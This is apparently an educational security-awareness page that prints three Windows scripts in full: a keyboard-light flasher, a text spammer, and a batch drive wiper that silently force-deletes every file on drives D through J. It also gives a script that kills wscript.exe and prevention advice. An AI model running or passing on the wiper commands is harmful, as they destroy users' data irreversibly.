# Security Awareness Documentation

This document serves as educational material about potentially harmful scripts and how to protect against them. **DO NOT EXECUTE ANY OF THESE SCRIPTS** as they can cause harm to your system.

## Potentially Harmful Scripts

### 1. Keyboard Lights Flasher (keyboard_flasher.vbs)
```vbs
Set wshShell =wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "{CAPSLOCK}"
wscript.sleep 100
wshshell.sendkeys "{NUMLOCK}"
wscript.sleep 100
wshshell.sendkeys "{SCROLLLOCK}"
loop
```
**Effect:** This script repeatedly toggles the Caps Lock, Num Lock, and Scroll Lock keys, causing the keyboard indicator lights to flash continuously. While not immediately harmful to data, it can be annoying and disruptive.

### 2. Drive Wiper (drive_wiper.bat)
```bat
@echo off
del D:\*.* /f /s /q
del E:\*.* /f /s /q
del F:\*.* /f /s /q
del G:\*.* /f /s /q
del H:\*.* /f /s /q
del I:\*.* /f /s /q
del J:\*.* /f /s /q
```
**Effect:** This is an extremely dangerous script that attempts to delete all files on drives D through J. The deletion is:
- Silent (`/q` parameter)
- Forced (`/f` parameter) 
- Recursive through all subdirectories (`/s` parameter)

**WARNING:** This script can cause irreversible data loss. Once executed, the deleted files cannot be easily recovered without specialized data recovery software, and even then, complete recovery may not be possible. This is considered a one-time "hit and run" attack that causes immediate and potentially permanent damage.

### 3. Text Spammer (text_spammer.vbs)
```vbs
Set wshShell = wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "This is a harmless virus"
loop
```
**Effect:** This script repeatedly types the text "This is a harmless virus" wherever the cursor is positioned. It can disrupt work by making it impossible to type normally and might cause unintended actions if the text is entered into command prompts or active applications.

## Antivirus Solution (script_terminator.bat)

Below is a simple script that can help terminate malicious VBS scripts like the keyboard flasher and text spammer:

```bat
@echo off
echo Script Terminator - Emergency System Protection
echo =============================================
echo.
echo Scanning for malicious processes...
tasklist | findstr "wscript.exe" > nul
if %ERRORLEVEL% EQU 0 (
    echo ALERT: Found wscript.exe running!
    echo Terminating all wscript processes...
    taskkill /f /im wscript.exe
    echo Process terminated successfully.
) else (
    echo No malicious wscript processes found.
)
echo.
echo Checking system integrity...
echo.
echo NOTE: If files were deleted by the drive wiper script,
echo immediate actions are required:
echo 1. Disconnect the affected drives
echo 2. Do not write any new data to them
echo 3. Use professional data recovery services or software
echo   as deleted files are NOT recoverable through standard means
echo.
echo While this utility can stop active malicious scripts,
echo it CANNOT recover files deleted by the drive wiper script.
echo That damage is irreversible without professional recovery tools.
echo.
pause
```

## Important Notes:

1. The drive wiping script causes irreversible damage that cannot be fixed by the antivirus solution. Once files are deleted using the `/f /s /q` parameters, they bypass the recycle bin and are immediately removed.

2. The best protection against these types of scripts is prevention:
   - Never run scripts from untrusted sources
   - Use comprehensive antivirus software
   - Keep your operating system updated
   - Back up important data regularly
   - Be cautious about giving administrative privileges to applications

3. This document is provided for educational purposes only to raise awareness about potential security threats. Creating, distributing, or executing harmful scripts on systems without authorization is illegal and unethical.

## Emergency Response

If you suspect your system has been compromised:
1. Disconnect from the internet
2. Boot into safe mode if possible
3. Run reputable antivirus software
4. Consult with an IT security professional
5. Consider a clean installation if the system is severely compromised 